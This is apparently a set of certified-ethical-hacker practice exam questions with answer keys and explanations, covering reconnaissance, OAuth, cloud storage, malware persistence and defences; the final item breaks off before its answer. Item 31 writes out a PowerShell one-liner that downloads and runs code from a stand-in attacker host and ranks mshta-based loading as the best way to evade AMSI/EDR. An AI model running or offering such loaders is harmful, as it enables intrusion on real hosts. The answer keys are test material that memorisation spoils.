@@ -1,0 +1,944 @@
+1. Which tool in the classic dsniff suite is specifically aimed at forcibly terminating existing TCP connections (useful in labs to disrupt a legitimate endpoint and attempt takeover) by sending forged packets to the endpoints?
+A. tcpkill
+B. arpspoof
+C. urlsnarf
+D. webmitm
+Correct Answer: A Explanation: tcpkill (part of the dsniff toolkit) actively injects forged TCP packets (e.g., RSTs) to kill or disrupt established TCP connections based on host/port filters — a technique sometimes used in controlled lab settings to desynchronize or interrupt flows prior to attempting takeover. arpspoof (B) performs ARP poisoning to perform MITM redirection on local LANs but does not itself inject RSTs to kill sessions. urlsnarf (C) passively logs HTTP requests/URLs from captured traffic (useful for reconnaissance) but does not disrupt sessions. webmitm (D) is not a standard dsniff tool name here (there are web-facing MITM utilities but not a canonical “webmitm” in dsniff); it’s not the specific tcp-termination tool. In controlled testing, tcpkill is the explicit utility for killing sessions.
+
+2. Your target uses OAuth 2.0/OIDC for “Sign in with Provider.” During testing, you find the authorization server accepts multiple callback endpoints and the relying party (RP) allows arbitrary subpaths. Which parameter MUST be strictly allowlisted (exact match or with well-scoped patterns) to prevent authorization code leakage via open redirects?
+A. redirect_uri
+B. state
+C. scope
+D. response_type
+Correct Answer: A Explanation: The redirect_uri determines where the authorization server sends the authorization code or tokens; if it’s not strictly allowlisted, an attacker can pivot through open redirectors to capture codes/tokens (A). The state (B) mitigates CSRF and session mix-ups but does not stop code delivery to a hostile URI if the redirect URI itself is not constrained. scope (C) limits token permissions, not where they are sent. response_type (D) dictates code vs token delivery but again doesn’t restrict destinations. Best practice is exact-match redirect_uri registration, pairing with state and PKCE, and rejecting wildcards/unregistered hosts.
+
+3. While analyzing a raw email header to trace the true sending path, which field provides the MOST reliable origin detail for footprinting when evaluated correctly?
+A. Return-Path
+B. From:
+C. The earliest (bottom-most) Received: header added by the first MTA
+D. Reply-To:
+Correct Answer: C Explanation: The most defensible way to reconstruct the sending path is to parse the Received: chain chronologically; the earliest (bottom-most) Received: header is added by the first Mail Transfer Agent (MTA) that handled the message and typically includes the originating client/MTA hostname and connecting IP—crucial for source attribution during email footprinting. A) Return-Path is set by the final MTA and often reflects the bounce address, which can be spoofed or rewritten. B) From: is a display identity, trivially spoofable and not transport-authenticated. D) Reply-To: is user-controlled and useful for social-engineering detection but not reliable for transport path reconstruction. Robust methodology correlates the earliest Received: with Authentication-Results (SPF/DKIM/DMARC) to strengthen confidence.
+
+4. During a supply-chain review, you find a CI system (e.g., GitHub Actions/GitLab CI) stores static cloud API keys as repository secrets used by pipelines. A compromise of the CI runner allowed an attacker to exfiltrate these keys and pivot into the cloud account. What is the BEST architectural remediation?
+A. Encrypt the static keys with KMS and decrypt them at job start
+B. Restrict CI runners by IP allowlist to call the cloud provider APIs
+C. Replace static keys with OIDC/workload identity federation from CI to the cloud; issue short-lived, scoped tokens with least-privilege
+D. Require developers to manually rotate the keys after each deployment
+Correct Answer: C Explanation: C is correct because OpenID Connect/workload identity federation eliminates static secrets in CI by exchanging signed identities for short-lived tokens scoped by IAM conditions/permissions boundaries; even if the runner is compromised, token lifetime/scope limit blast radius; A keeps long-lived keys (encryption at rest ≠ removal of secret); B reduces where calls originate but doesn’t stop key theft or misuse; D improves hygiene but leaves the fundamental static-secret risk. CEH-aligned practices: least-privilege roles, signed provenance (SLSA), admission verification, and secret-zero elimination patterns.
+
+5. While enumerating asset storage, you identify media.target.com as a CNAME to media-target-public.s3.amazonaws.com. You must verify exposure without exceeding scope or altering data. What is the BEST next step?
+A. Attempt to upload a test file to verify write permissions on the bucket
+B. Brute-force AWS access keys using leaked credential wordlists to test authenticated access
+C. Mirror the entire bucket to local storage to ensure a complete assessment
+D. Perform unauthenticated HEAD/GET requests (e.g., aws s3 ls s3://bucket or direct HTTPS) to test listing and object read permissions; if listing is blocked, probe for predictable object keys cautiously and document bucket policy behavior
+Correct Answer: D Explanation: Proper, low-impact verification for public cloud storage exposure uses unauthenticated listing/read checks to determine whether the bucket or objects are world-readable; if ListBucket is denied, you can still test for inadvertent public objects via predictable keys (e.g., /logos/, /images/, release artifacts), always staying read-only and within scope. Upload attempts (A) change state and are typically out of scope. Credential brute forcing (B) is unethical and prohibited. Bulk mirroring (C) is unnecessary, bandwidth-heavy, and potentially disruptive; collect minimal evidence (policy behavior, sample headers, ACL indicators) and report with remediation guidance (restrict bucket policy, enforce OAC/VPC endpoints, apply least privilege).
+
+6. Which active network probe is a defensible technique to detect centralized sniffers that rely on port mirroring (SPAN) but may not be present on every access switch?
+A. Send crafted multicast frames with unlikely multicast addresses and monitor whether they are observed on the mirrored analysis host (if you control it)
+B. Flood the network with DHCPDISCOVER packets to stress the DHCP server
+C. Continuously ping all hosts to force ARP requests and reveal sniffers
+D. Run a continuous traceroute to every internal host
+Correct Answer: A Explanation: A is correct because sending crafted multicast (or unicast-to-nonexistent) frames that normally would not traverse to the analyzer unless mirrored, and then checking whether those frames appear on the mirrored collector, can reveal whether port mirroring is configured to include certain ports or VLANs—this is a focused, minimally disruptive probe to detect SPAN-based sniffers. Option B (DHCPDISCOVER flood) is an attack-like behavior and disruptive. Option C (continuous ping) generates normal traffic but won’t reliably expose SPAN collectors; it can create noise and false positives. Option D (traceroute) tests routing paths, not L2 mirroring. Carefully scoped active probes like (A) are standard in defensive audits to discover unauthorized mirroring.
+
+7. During an OAuth 2.0 integration review, you observe that the relying party uses the Authorization Code flow but omits the state parameter and has no equivalent CSRF protection in the authorization request. A tester demonstrates “login CSRF” to bind a victim’s browser to the attacker’s account, after which the attacker piggybacks the victim’s actions. Which fix most directly addresses this risk?
+A. Shorten the access token lifetime from 60 minutes to 10 minutes
+B. Switch to storing access tokens in sessionStorage
+C. Include and validate a strong state value (or PKCE + state) on every authorization request
+D. Rotate the refresh token on every API call
+Correct Answer: C Explanation: The state parameter (and PKCE where applicable) provides request integrity linking the authorization response to the initiating client context, preventing login CSRF and session swapping; robust validation of state is the primary, standards-aligned mitigation. A does not stop account pre-binding; attackers can complete the authorization immediately. B still allows login CSRF because storage location does not validate the initiation context. D (rotating refresh tokens) is good hygiene but does not prevent the initial cross-site authorization response from being accepted by the client without a validated state.
+
+8. You're performing reconnaissance and come across conflicting WHOIS/RDAP ownership data for several prefixes. Which procedural step in a robust footprinting methodology should you take NEXT to resolve or contextualize the discrepancy?
+A. Publish the discrepancy publicly to pressure the organization into correcting registration data
+B. Cross-reference with Regional Internet Registry (RIR) records, BGP routing data, and company filings or ARIN/RIPE lookup notes to determine current allocations and historical transfers
+C. Assume the most recent-looking WHOIS contact is authoritative and proceed with active scanning
+D. Send unsolicited queries to the IP block owner’s network operations center (NOC) demanding clarification
+Correct Answer: B Explanation: The correct methodological step is to cross-reference multiple authoritative sources—RIR/registry records (ARIN, RIPE, APNIC), BGP route views (RouteViews, RIPE RIS), and corporate filings—to determine the current netblock owner and any historical transfers or lease arrangements; this triangulation provides context without prematurely provoking or misattributing ownership. Option A is inappropriate and unprofessional; public disclosure can be escalatory and may breach confidentiality. Option C is risky: assuming a single WHOIS contact is authoritative and immediately performing active scans may cause misdirected activity and legal exposure. Option D (sending unsolicited demands) is active and potentially hostile; it should only be done via agreed escalation paths defined in the RoE.
+
+9. A multinational wants certification to a standard that specifies requirements for establishing, implementing, maintaining, and continually improving an Information Security Management System (ISMS). Which standard best fits this need?
+A. ISO/IEC 27002 (security controls code of practice)
+B. NIST SP 800-53 (security and privacy control catalog for U.S. federal systems)
+C. SOC 2 Type II (attestation framework focused on Trust Services Criteria)
+D. ISO/IEC 27001 (ISMS requirements; certifiable)
+Correct Answer: D Explanation: ISO/IEC 27001 defines requirements for an ISMS and is certifiable by accredited bodies; organizations can be audited and certified against it. A (27002) is guidance—detailed control practices that support 27001’s Annex A but are not certifiable on their own. B is a U.S. federal control catalog (paired with FIPS 199/200 and RMF), not an organizational certification. C is an attestation based on AICPA’s Trust Services Criteria, not an ISO certification; scope and criteria differ from an ISMS standard.
+
+10. A customer prohibits any queries to their infrastructure, including DNS lookups to their authoritative servers. You still need to enumerate historical and current subdomains to understand the organization’s external footprint. Which method is MOST appropriate?
+A. Use SMTP VRFY against the company’s MX hosts to infer valid hostnames and accounts
+B. Send benign test messages to distribution lists and harvest auto-replies for host clues
+C. Crawl the target website for JavaScript references and resolve discovered hostnames directly against the target NS
+D. Query passive DNS datasets (e.g., SecurityTrails, DNSDB, RiskIQ PassiveTotal) to retrieve historical resolutions for the target domain
+Correct Answer: D Explanation: Passive DNS repositories aggregate historical DNS observations from third-party sensors and resolvers, enabling subdomain and infrastructure discovery without contacting the target’s nameservers, consistent with strictly passive reconnaissance and MITRE T1596/T1590. Option A (SMTP VRFY) interacts with the target’s MX infrastructure and is noisy/active; many servers block VRFY. Option B involves sending unsolicited email to the target—this is interaction (active) and typically out of scope at the footprinting phase without explicit approval. Option C requires resolving discovered names against the target NS, which violates the “no queries to their infrastructure” constraint and leaves logs.
+
+11. An attacker compromises a webhook secret and can forge signed payloads to trigger backend workflows like user creation. What is the most direct impact?
+A. Injection of malicious JavaScript into browser clients
+B. Unauthorized actions performed by the receiving application, leading to privilege escalation
+C. Exfiltration of TLS private keys from the server
+D. Denial-of-service by exhausting API rate limits
+Correct Answer: B Explanation: Forging signed webhook payloads allows attackers to invoke backend workflows as if they were trusted providers, leading to privilege escalation or unauthorized actions (B). JavaScript injection (A) is not implied. TLS key theft (C) and DoS (D) are unrelated. Defense: rotate webhook secrets, validate payload signatures with HMAC/SHA, and implement strict origin validation.
+
+12. Which persistence mechanism is MOST stealthy from a host-based forensic perspective because it stores payloads in places not listed by normal directory listings and is often overlooked?
+A. Dropping a binary in %TEMP% and hiding the file attribute.
+B. Storing a payload inside an NTFS Alternate Data Stream (ADS) attached to an innocuous file.
+C. Creating a hidden service with an innocuous display name.
+D. Installing a scheduled task that runs a PowerShell script from %APPDATA%.
+Correct Answer: B Explanation: Option B is correct because NTFS Alternate Data Streams attach named streams to an existing file’s primary data stream and do not appear as separate files in normal dir/Explorer listings; ADS can be used to conceal small executables, configuration blobs, or scripts in otherwise benign files and are commonly overlooked in cursory examinations unless stream enumeration tools are used. Option A (file in %TEMP% with hidden attribute) is visible via dir /a and many EDRs/forensics tools monitor %TEMP% for suspicious executables; it is not as covert as ADS. Option C (hidden service) still creates a service registration that shows up in SCM (sc query) and event logs; it’s persistent but not stealthy at the filesystem/stream level. Option D (scheduled task in %APPDATA%) is visible via schtasks/Task Scheduler and leaves clear metadata and execution events. Defenders should enumerate ADS (e.g., streams.exe, Get-Item -Stream *), monitor unusual stream usage, and apply FIM to detect nonstandard streams.
+
+13. An internal NAS provides NFS to engineering subnets. Recent tests showed anyone on the campus network can run showmount -e to list exports and attempt mounts. What change MOST effectively reduces enumeration from untrusted hosts while preserving NFS for authorized clients?
+A. Enable no_root_squash on all exports to normalize client identities
+B. Switch exports to UDP only to reduce discoverability by TCP scanners
+C. Disable NFSv4 and rely on mountd restrictions
+D. Restrict rpcbind/mountd and NFS (RPC/111 and TCP/2049) to authorized client subnets with host/firewall ACLs; prefer NFSv4 (pseudo-root) and disable showmount externally
+Correct Answer: D Explanation: Tight network-layer restrictions on rpcbind/mountd and NFS ports to authorized subnets, combined with NFSv4 (which removes separate mountd exposure) and blocking showmount from untrusted sources, directly curtails export enumeration and opportunistic mounting (D). Option A increases risk (root mapping), not security. Option B (UDP) is obsolete/less reliable and does not address information leakage. Option C removes v4’s security benefits and keeps mountd exposed.
+
+14. A Windows server fleet shows inconsistent patch status in reports. The team wants the vulnerability scanner to enumerate installed KBs, service/file versions, and missing hotfixes reliably without relying on banner inference. Which configuration choice BEST enables accurate findings in this context?
+A. Enable only TCP SYN scans with service version detection to avoid intrusion alerts.
+B. Use domain or least-privileged local Windows credentials with WMI/SMB/WinRM for credentialed host assessment.
+C. Query SNMPv2 read-only communities to pull software inventories from each host.
+D. Depend on external web fingerprinting (e.g., HTTP headers) to infer OS patch levels.
+Correct Answer: B Explanation: B is correct because credentialed (authenticated) scanning against Windows via WMI/SMB/WinRM enumerates installed updates, registry keys, and file versions directly, drastically reducing false positives and false negatives—this is a core capability of enterprise tools (e.g., Nessus, Qualys, OpenVAS/GVM) and a CEHv13-aligned best practice for host vulnerability assessment. A is incorrect since SYN and version detection are network-level heuristics that cannot authoritatively read local patch state. C is incorrect because SNMPv2 typically does not expose comprehensive Windows patch inventories and introduces security concerns due to weak community strings. D is incorrect because HTTP/other banner checks are often stale or masked and cannot reliably prove host OS hotfix status.
+
+15. While reviewing a mobile app’s crypto, you discover it uses AES-GCM correctly but with a device-scoped random 96-bit nonce that is generated once at first run and reused for all messages on that device. What is the MOST critical risk of this design?
+A. None; GCM is secure regardless of nonce reuse as long as the key is strong
+B. Only integrity is affected; confidentiality remains intact with reused nonces
+C. Catastrophic loss of confidentiality and forgeries if a nonce is ever reused with the same key
+D. Slight performance degradation due to repeated GHASH initialization
+Correct Answer: C Explanation: AES-GCM is an AEAD mode that is critically dependent on unique nonces per key; reusing a nonce with the same key can reveal plaintext relationships and, more severely, enable computation of the authentication subkey and allow chosen-ciphertext forgeries, making C correct. A is false; GCM security proofs assume nonce uniqueness. B is wrong because both confidentiality and integrity can fail under nonce reuse. D is irrelevant; the issue is not performance. CEHv13 expects candidates to know that AEAD modes (GCM/ChaCha20-Poly1305) mandate unique nonces; developers should use counters or vetted libraries that enforce nonces, or use deterministic constructions that derive nonces safely (e.g., per-message counters, never per-device reuse). Tools like Mobile Security Framework (MobSF) or static analysis can flag constant IV/nonce patterns.
+
+16. During BLE pairing, which pairing method provides the strongest resistance to Man-In-The-Middle (MITM) attacks when a secure external channel is available?
+A. Just-Works (no authentication)
+B. Numeric Comparison (user verifies a displayed number)
+C. Out-of-Band (OOB) pairing using a physically separate secure channel (e.g., NFC)
+D. Passkey Entry with a single 4-digit PIN displayed on one device only
+Correct Answer: C Explanation: Out-of-Band (OOB) pairing uses an external secure channel (for example NFC, QR scan, or wired exchange) to transfer cryptographic material or confirmation data outside the RF link; because the secret or confirmation is conveyed via a channel an attacker cannot easily manipulate, OOB provides the strongest MITM resistance. Numeric Comparison (B) also provides MITM protection when both devices display the same number and the user verifies it — it is robust for Bluetooth Classic and LE Secure Connections but depends on correct user action. Just-Works (A) provides no MITM protection (it accepts the DH key without authentication), so it is vulnerable. Passkey Entry (D) can be strong when the full passkey is entered by both parties (typically 6 digits) but a single 4-digit PIN displayed on only one device is weaker and easier to social-engineer; overall OOB is the top choice when available.
+
+17. While scanning a web application, you find that directory listing is enabled, revealing /backup/, /config/, and /logs/. What is the primary risk?
+A. Cross-site request forgery
+B. Exposure of sensitive files that can aid further exploitation
+C. Privilege escalation through weak session handling
+D. Denial-of-service due to excessive directory traversal
+Correct Answer: B Explanation: Directory listing exposes sensitive files (source code, backups, logs) that attackers can use to escalate attacks (B). CSRF (A) and session handling (C) are unrelated. DoS through traversal (D) is not accurate; the risk is information disclosure. Mitigation: disable directory browsing and enforce least-privilege file permissions.
+
+18. Your report must enable remediation tracking and auditability. Which table structure BEST supports closure evidence and governance?
+A. Finding ID, Title, Affected Assets, Severity, Owner, Due Date, Remediation Steps, Validation Method, Status, Exception/Acceptance Reference (POA&M), and Evidence Link.
+B. Asset Name, IP address, MAC address, Operating System, and Installed Applications.
+C. Scanner Name, Scan Duration, Number of Packets Sent, and Network Throughput.
+D. CWE and OWASP Top 10 mappings only, without asset-level fields, to simplify the report.
+Correct Answer: A Explanation: A is correct because CEHv13 emphasizes actionable reporting that drives remediation and governance; including owners, due dates, validation methods (e.g., retest plugin ID or manual POC), status states, and exception identifiers (POA&M/ risk acceptance ticket) provides traceability and closure evidence for auditors. B is incorrect because inventory alone doesn’t track remediation or validation. C is incorrect since scan mechanics may be useful operationally but do not enable governance of remediation. D is incorrect because taxonomy mapping (CWE/OWASP) is helpful context, not a substitute for workflow-driving fields like ownership, status, and proof of closure.
+
+19. A legacy host exposes TFTP (UDP/69). You want to enumerate accessible files non-destructively, without guessing paths blindly or uploading anything. Which technique is BEST?
+A. Use SFTP on port 69 to request directory listings and file hashes
+B. Attempt “put” first to test write access and then “get” arbitrary files if successful
+C. Use Nmap’s tftp-enum NSE script to probe for common files and directory traversal behaviors
+D. Use FTP STAT and FEAT to obtain a recursive directory listing of the TFTP root
+Correct Answer: C Explanation: tftp-enum is purpose-built to safely probe TFTP servers for common files (e.g., configs, pxelinux.0, startup-config) and to test for traversal quirks, providing low-impact enumeration (C). SFTP (A) is SSH-based on TCP/22, unrelated to TFTP. Initiating “put” (B) is intrusive, potentially alters the system, and violates non-destructive goals. FTP commands (D) operate on TCP/21 and do not apply to TFTP, which lacks authentication and listing capabilities by design.
+
+20. During a physical assessment, testers scatter branded USB drives in the lobby labeled “Q3 Bonus Structure” that actually present as HID keyboards (BadUSB) and auto-type a PowerShell one-liner when inserted. Which technique is being exercised?
+A. Tailgating through an access-controlled turnstile
+B. Dumpster diving for compensation data
+C. Baiting via malicious removable media (USB drop/BadUSB)
+D. Pharming by altering internal DNS to fake HR sites
+Correct Answer: C Explanation: Baiting entices victims with an appealing object or resource (e.g., “Q3 Bonus Structure” USB) to trigger compromise; the BadUSB/HID facet swaps mass-storage for keystroke injection, still falling under baiting as the social engineering catalyst. Tailgating (A) concerns physical entry; dumpster diving (B) is passive retrieval of discarded materials; pharming (D) manipulates DNS resolution and does not involve physical media lures.
+
+21. A red team discovers that an MDM system communicates with devices over HTTP instead of HTTPS. They inject malicious payloads into MDM update responses to install unauthorized apps. Which security principle was violated here?
+A. Least privilege
+B. Secure channel enforcement (confidentiality and integrity)
+C. Segregation of duties
+D. Principle of non-repudiation
+Correct Answer: B Explanation: Using HTTP instead of HTTPS violates secure channel principles, allowing interception and tampering with MDM communications (B). Least privilege (A) deals with permission minimization, not transport. Segregation of duties (C) relates to governance controls, not encryption. Non-repudiation (D) refers to accountability mechanisms, not securing the channel.
+
+22. Users are approving a malicious cloud app that requests Mail.Read and Files.ReadWrite.All via a consent screen linked from social media; mailbox access continues despite password resets. Which single countermeasure MOST decisively stops this vector?
+A. Enforce identity-provider (IdP) app-consent governance: admin approval/publisher verification required, block risky scopes, and revoke existing grants/tokens
+B. Deploy a secure email gateway (SEG) with URL rewriting and attachment sandboxing
+C. Harden EDR policies to block macro-enabled Office documents
+D. Enable strict DMARC alignment with p=reject on the corporate domain
+Correct Answer: A Explanation: A directly targets consent-phishing by preventing unverified apps from being granted privileged scopes and by revoking surviving refresh/access tokens; it addresses the independence of OAuth tokens from passwords. B helps email-borne attacks but not social-platform links or token grants. C is unrelated to OAuth consent. D protects against domain spoofing but does not govern third-party OAuth applications or kill active tokens.
+
+23. During a security review of an MQTT-based smart building deployment, you discover the Mosquitto broker accepts anonymous connections and all devices publish/subscribe using wildcard topics (e.g., building/#). The integrator asks for the single most effective configuration change to immediately prevent unauthorized clients from subscribing to or publishing across device topics without disrupting the architecture. What should you recommend?
+A. Increase all device QoS levels to 2 to guarantee exactly-once delivery
+B. Disable anonymous access and enforce per-client authentication with topic-level ACLs (namespacing)
+C. Turn off the MQTT retained flag on all publishes to avoid stale messages
+D. Move clients to MQTT over WebSockets on TCP/443 to blend in with HTTPS traffic
+Correct Answer: B Explanation: Enforcing identity and authorization at the broker with per-client credentials (e.g., username/password, client certs) and topic-based ACLs (namespaced like site1/floor3/sensor42/#) directly mitigates unauthorized publish/subscribe, aligning with OWASP IoT controls for strong authentication/authorization and least privilege; disabling anonymous logins closes the biggest gap, while A (QoS 2) affects delivery semantics only and does not provide access control, C (retained flag) deals with persistence not authorization, and D (WebSockets over 443) changes transport appearance but does not prevent an attacker from anonymously subscribing/publishing once connected—only proper authn/authz and ACLs do, and TLS can be layered in addition to ACLs for confidentiality and integrity as a best practice.
+
+24. A security policy requires preventing cleartext credential disclosure during sniffing tests. Which application-layer control will MOST effectively mitigate credential theft even if an attacker succeeds at L2/L3 MITM?
+A. Enforce HTTPS/TLS with valid certificates and HSTS for all web applications (no fallback to HTTP)
+B. Block all outbound DNS queries to external resolvers
+C. Disable ARP on all hosts to prevent poisoning
+D. Increase TCP window sizes to reduce packet fragmentation
+Correct Answer: A Explanation: Enforcing HTTPS/TLS with valid certificates and HSTS (HTTP Strict Transport Security) (A) prevents easy interception of credentials at the application layer because sensitive flows are encrypted end-to-end; HSTS helps prevent downgrade attacks that might try to force HTTP. This remains effective even if an attacker is on-path at L2/L3, assuming TLS is correctly implemented and clients validate certificates (pinning/OCSP can further strengthen). Blocking DNS (B) is not practical and does not stop credential capture on allowed encrypted channels. Disabling ARP (C) is not feasible in Ethernet networks. TCP window sizing (D) is unrelated. CEHv13 emphasizes encryption (TLS, SSH, VPNs) as the primary countermeasure against sniffing of credentials.
+
+25. A financial services website is configured to support OCSP stapling. Which security improvement does OCSP stapling provide compared to traditional OCSP?
+A. It prevents CA compromise by distributing stapled SCTs to clients
+B. It allows the server to provide recent revocation status without contacting the CA in real-time
+C. It ensures end-to-end encryption of certificate revocation lists between server and client
+D. It enforces certificate pinning during TLS handshake
+Correct Answer: B Explanation: OCSP stapling enables the server to “staple” a recent OCSP response signed by the CA into the TLS handshake, avoiding client-CA round-trips and improving both privacy and performance, making B correct. A is misleading—SCTs (Signed Certificate Timestamps) are part of Certificate Transparency, not OCSP. C confuses CRLs (downloaded in bulk) with OCSP responses. D is wrong; stapling is unrelated to certificate pinning. CEHv13 exam requires differentiating between OCSP, OCSP stapling, CRLs, and CT logs.
+
+26. Which of the following is BEST categorized as a volumetric DDoS attack rather than a protocol-state exhaustion or application-layer attack?
+A. TCP SYN flood targeting the victim’s backlog queue
+B. Slowloris holding many HTTP connections open with partial headers
+C. UDP reflection from exposed memcached servers on 11211 with very high amplification
+D. TCP RST injection to tear down established connections
+Correct Answer: C Explanation: Volumetric attacks aim to saturate bandwidth/packet-processing capacity (measured in bps/pps) and are often achieved via amplification/reflection like memcached UDP (amplification factors that can exceed 10–100× when misconfigured), DNS, NTP, SSDP, or CLDAP. Option A is protocol-state exhaustion (transport-layer). Option B is application-layer concurrency starvation. Option D manipulates TCP control flags to disrupt sessions (a state manipulation attack), not primarily a bandwidth flood.
+
+27. A checkout form displays the price in a disabled field and enforces a minimum quantity using HTML5 min and JavaScript validation. However, your proxy shows the POST body includes {"item_id":42,"qty":1,"unit_price": "99.99"}. Which action BEST demonstrates bypassing the client-side controls to validate server-side enforcement?
+A. Use Burp Repeater to modify unit_price to 0.01 and qty to 0, then resend the POST directly to the endpoint, ignoring any UI/JS checks
+B. Enable Chrome DevTools and uncheck “Disable JavaScript,” then reload and submit normally to see if the minimum fails
+C. Export the page as PDF to capture evidence of the disabled field and attach it to your report without sending modified traffic
+D. Add a custom request header X-Bypass: true to tell the server to skip validation, then submit the form
+Correct Answer: A Explanation: Client-side controls (disabled fields, HTML5 min, JS validators) are not security boundaries; crafting the raw HTTP request via Burp Repeater/Postman/curl and changing unit_price/qty proves whether the server enforces rules, so (A) directly tests bypass. (B) keeps browser validation in place and does not bypass anything. (C) gathers evidence but does not test enforcement. (D) is unrealistic and not a standard mechanism; security-critical checks must never rely on such headers. Proper mitigation is authoritative server-side validation and business-rule enforcement irrespective of UI state, with server-side recalculation of price-sensitive fields.
+
+28. A user opens an internal wiki page that silently triggers a one-time XSS payload, which causes the browser to spawn mshta.exe that fetches and executes a remote HTA over HTTPS. No new executables are written to disk; the follow-on stage lives only in memory, issuing commands and exfiltrating data through the existing user session. Which technique BEST characterizes this initial fileless execution?
+A. Signed binary proxy execution using mshta.exe to run remote script content (“living off the land”)
+B. DLL search-order hijacking by placing a malicious DLL earlier in the load path of a trusted EXE
+C. Macro virus persistence by infecting the Office global template (Normal.dotm)
+D. Driver-level rootkit loading via a vulnerable kernel driver (BYOVD)
+Correct Answer: A Explanation: A is correct because mshta.exe is a Microsoft-signed LOLBin capable of executing HTML/JS/VBScript logic directly from a URL, enabling truly fileless, memory-resident staging (MITRE ATT&CK T1218.005). It fits CEH’s fileless model: no payload written, execution via a trusted signed host. B is incorrect because DLL search-order hijacking requires a surreptitious DLL on disk and a vulnerable load path, which contradicts URL-fetched script execution. C is incorrect since Normal.dotm macro infection is document-centric and disk-resident; it’s a macro virus pattern, not LOLBin remote script execution. D is incorrect because BYOVD implies kernel-mode loading of a driver file and persistence via the service database—again, disk artifacts, not pure script-based memory execution through mshta.exe.
+
+29. A public-facing legacy web application is confirmed vulnerable to SQL injection, but the vendor patch is delayed for six weeks and the business cannot take the application offline. Which measure is the most appropriate compensating control to mitigate exploitation risk in the interim?
+A. Apply emergency OS kernel patches to the web servers within 24 hours
+B. Deploy targeted WAF virtual patching rules to block SQLi payloads at the endpoint URI
+C. Enforce stricter password history and complexity for all web users
+D. Increase full and incremental backup frequency of the database servers
+Correct Answer: B Explanation: A compensating control is a security measure that satisfies the intent of a primary control when the primary control (the vendor patch) cannot be implemented in time. B is correct because WAF virtual patching (e.g., precise signatures, parameter allowlists, and positive security models bound to the specific vulnerable route) can block SQLi payload classes without touching application code; this aligns with CEH guidance and PCI DSS’s formal notion of compensating controls. A is incorrect because OS kernel patching does not remediate an application-layer injection flaw. C (password policy) addresses authentication hardening, not injection. D (more backups) is a recovery enhancement; it does not reduce the likelihood of SQLi exploitation and therefore is not an effective compensating control for this threat.
+
+30. While analyzing OTA behavior of an IP camera, you intercept an update URL over HTTP that returns a .bin image. Binwalk shows a squashfs filesystem but no signature metadata; strings reveal upgrade.sh runs as root. In the IoT hacking methodology, which step MOST appropriately validates exploitability with the least operational risk?
+A. Live-flash the device with a modified image to confirm code execution
+B. Emulate the firmware in QEMU/firmadyne/FACT-lab to assess update scripts and identify command injection paths offline
+C. Brute force the root password from the web UI to gain shell and read /etc/upgrade.sh
+D. Perform voltage glitching on the flash chip to bypass secure boot and then dump rootfs
+Correct Answer: B Explanation: The CEH approach favors offline analysis before touching production hardware: extract and emulate firmware (firmadyne/FACT/QEMU chroot), review upgrade.sh logic, and test command injection/validation paths in a safe sandbox; only after confirming a viable path should you consider on-device proof-of-concept with change control. A (live-flash) is high risk for bricking; C is unrelated to validating the OTA chain and assumes a shell; D (fault injection) is invasive and unnecessary when software paths exist.
+
+31. You have low-privilege access to a Windows host and want to execute a one-line PowerShell loader without dropping a persistent binary to disk and while minimizing AMSI/EDR detection. Which technique is MOST appropriate?
+A. Invoke powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/p')" from cmd.exe.
+B. Use mshta.exe to run a remote HTML application that executes VBScript to call powershell -enc <base64> and launch the loader.
+C. Drop a compiled EXE in C:UsersPublic and run it; then delete the file after execution.
+D. Create a scheduled task that launches cmd.exe which in turn runs the PowerShell one-liner every 5 minutes.
+Correct Answer: B Explanation: Option B is correct because mshta.exe is a legitimate Microsoft binary (a LOLBIN) that can execute HTML Applications (HTA) and scripting (VBScript/JScript) directly from memory or a remote URL, which lets an attacker invoke PowerShell indirectly (e.g., via a script that builds and invokes a base64-encoded command). This method frequently avoids straightforward AMSI/EDR string-based detections because the initial process is mshta.exe and the payload can be executed in-memory with obfuscation layers; CEH curriculum covers using living-off-the-land binaries like mshta to execute code with low on-disk footprint. Option A directly calls powershell.exe with DownloadString and is very common but many EDRs/AMSI hooks inspect powershell.exe command lines and IEX+DownloadString patterns—making it noisier. Option C (dropping an EXE) creates an on-disk artifact that is easily discovered by AV/EDR and file-integrity monitoring, and deleting after execution still leaves traces. Option D (scheduled task) is persistent and noisy—good for maintaining access but not for a one-off stealthy execution; scheduled tasks are commonly audited and can trigger alerts. Defenses: enable AMSI/PowerShell logging, block or restrict mshta/powershell via AppLocker or WDAC, monitor uncommon child-process chains and remote HTA fetches.
+
+32. You want to perform DNS reconnaissance that includes enumerating NS/MX/SOA, testing for AXFR, brute-forcing labels, scraping search engines for hostnames, and producing a consolidated report—all from one purpose-built tool. Which tool BEST fits?
+A. theHarvester
+B. Metasploit auxiliary scanner/discovery modules
+C. dnschef
+D. DNSRecon
+Correct Answer: D Explanation: DNSRecon is designed for DNS footprinting: it enumerates records (A/AAAA/CNAME/MX/NS/SOA/TXT/SRV), checks zone transfers, conducts brute-force, reverse lookups, and integrates multiple discovery techniques into cohesive output—ideal for CEH DNS recon. theHarvester (A) targets emails/hosts via search engines; useful but broader and less DNS-focused. Metasploit (B) can do discovery but is heavier and not as targeted for DNS workflows. dnschef (C) is a DNS proxy/spoofer for lab/red-team deception, not enumeration.
+
+33. After a web scanner reports multiple Medium CVSS findings on an internet-facing application, you validate that two have public exploits and rising EPSS, but patching will take two weeks due to regression risks. What is the MOST appropriate immediate action aligned with vulnerability assessment/remediation concepts?
+A. Downgrade the findings to Low until the patch window to avoid audit issues.
+B. Close the findings as “accepted risk” since patching is scheduled within the month.
+C. Apply compensating controls (e.g., targeted WAF rules/virtual patching and hardening) to reduce exploitability now, document POA&M/exception, and schedule expedited retest after change.
+D. Pause vulnerability scanning to reduce noise while developers work on the patch.
+Correct Answer: C Explanation: C is correct because compensating controls like WAF virtual patching, input validation hardening, or access restrictions reduce exposure immediately; documenting a Plan of Action and Milestones (POA&M), setting an exception with a clear SLA, and scheduling verification rescans align with CEHv13 best practices. A is incorrect as severity manipulation is unethical and defeats risk management. B is incorrect because “acceptance” without interim controls ignores active exploit signals (EPSS/public exploits) and internet exposure. D is incorrect since pausing scans removes detection/feedback loops needed to monitor for regression and control effectiveness.
+
+34. A tester is attempting to return arbitrary table data within the current page response by injecting UNION SELECT clauses. They iterate with ORDER BY probes to discover the base query’s column count and adjust NULL placeholders until the page renders values. Which SQL injection type is this approach targeting?
+A. Second-order SQL injection
+B. Time-based blind SQL injection
+C. UNION-based in-band SQL injection
+D. Stacked (piggy-backed) SQL injection
